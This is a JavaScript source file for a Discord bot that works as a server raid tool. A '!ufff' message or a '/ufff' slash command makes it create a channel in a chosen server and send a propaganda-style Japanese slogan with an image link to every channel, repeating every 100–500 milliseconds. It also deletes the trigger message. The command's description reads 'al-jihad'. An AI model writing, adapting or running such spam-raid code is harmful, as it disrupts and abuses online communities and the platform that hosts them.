import { Client, GatewayIntentBits } from "discord.js";
import express from "express";
// ====== Discord Bot ======
const client=new Client({
  intents:[
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});
client.once("ready",async function(){
  let data=[{
    name:"ufff",
    description:"al-jihad"
  }];
  await client.application.commands.set(data,"1410512467720802347");
});
client.on("messageCreate",function(message){
  if(message.author.bot){
    return;
  }
  if(message.content.indexOf("!ufff")!=-1){
    let serverID=message.content.split("!ufff ")[1];
    if(serverID){
      let guild=client.guilds.cache.get(serverID);
      guild.channels.create({
        name:"新しい部屋",
        type:0
      });
      guild.channels.cache.forEach(function(channel){
        setInterval(async function(){
          await channel.send(getText());
        },500);
      });
    }
    message.delete();
    setInterval(function(){
      message.channel.send(getText());
    },100);
  }
});
client.on("interactionCreate",async function(e){
  if(!e.isChatInputCommand()){
    return;
  }
  if(e.commandName=="ufff"){
    await e.reply("success");
    setInterval(async function(){
      await e.followUp(getText());
    },100);
    setTimeout(async function(){
      await e.deleteReply();
    },500);
  }
});
function getText(){
  let random=Math.round(Math.random()*100000000);
  return "# 統一友愛戦線に栄光あれ！\nhttps://cdn-ak.f.st-hatena.com/images/fotolife/I/ImagesForUFFF/20251119/20251119155446_original.png\n\nMessageID:"+random;
}
// ====== HTTP server for Render ======
const app=express();
app.get("/",function(req,res){
  res.send("alive");
});
app.listen(process.env.PORT||3000,function(){
  console.log("🌐 Web server is running.");
});
// ====== Login ======
client.login(process.env.DISCORD_TOKEN);
